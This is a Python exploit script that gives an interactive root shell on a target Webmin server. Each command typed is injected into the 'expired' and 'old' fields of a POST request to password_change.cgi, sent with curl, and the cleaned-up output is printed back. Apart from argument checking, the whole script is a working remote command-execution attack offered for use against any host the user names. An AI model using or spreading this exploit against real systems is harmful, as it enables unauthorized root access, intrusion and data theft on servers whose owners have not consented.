#!/usr/bin/env python3

from termcolor import colored
from os import popen
from sys import exit
import argparse
from time import sleep

def Error(message):
    print(colored("[", "white", attrs=['bold']) + colored("!", 'red', attrs=['bold']) + colored("] ", "white", attrs=['bold']) + colored(message, "white", attrs=['bold'] ))
def Info(message):
    print(colored("[", "white",  attrs=['bold']) + colored("*", 'yellow', attrs=['bold']) + colored("] ", "white", attrs=['bold']) + colored(message, "white", attrs=['bold']))
def Good(message):
    print(colored("[", "white", attrs=['bold']) + colored("+", 'cyan', attrs=['bold']) + colored("] ", "white", attrs=['bold']) + colored(message, "white", attrs=['bold']))

def checker(ip, port):
    try:
        port = int(port)
    except:
        Error("Port must be an integer")
        exit()

    if int(port) > 65535:
        Error("No such port")
        exit()

    if not ip.startswith("http"):
        Error("Plase specify the schema")
        Info("http://blah.com")
        Info("https://10.10.10.120")
        exit()

    if ip.endswith("/"):
        Info("removing the / at the end of the ip ...")
        ip = ip[:-1]

    return ip, port

def exploit(ip,port):

        
    Info("Trying to pop root shell...")
    sleep(1)

    Good("You can type your commands")
    while True:
        cmd = input("$ ")
        all = f"""curl -d 'expired={cmd}&new1=abcabd&new2=abcabc&old={cmd}' -sk -X POST --referer "{ip}:{port}/session_login.cgi" "{ip}:{port}/password_change.cgi" """
        a = popen(all).read()

        # trying to delete some of the ugly output
        a = a.replace("</p>", '')
        a = a.replace("""<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.JSON
""", '')
        a = a.replace("""<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.""", '')


        # then printing the output
        print("\n" + a)


def main(ip, port):


    if port == 10000:
        Info("Using default port 10000")

    ip,port = checker(ip,port)
    Info(f"Launching script again {ip}:{port}")
    sleep(1)
    exploit(ip,port)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--port", help="The port of the target webmin (default: 10000)", required=False, default=10000 )
    parser.add_argument("-i", "--ip", help="The ip/dns of the target server", required=True)
    args = parser.parse_args()

    ip=args.ip ; port=args.port

    main(ip, port)
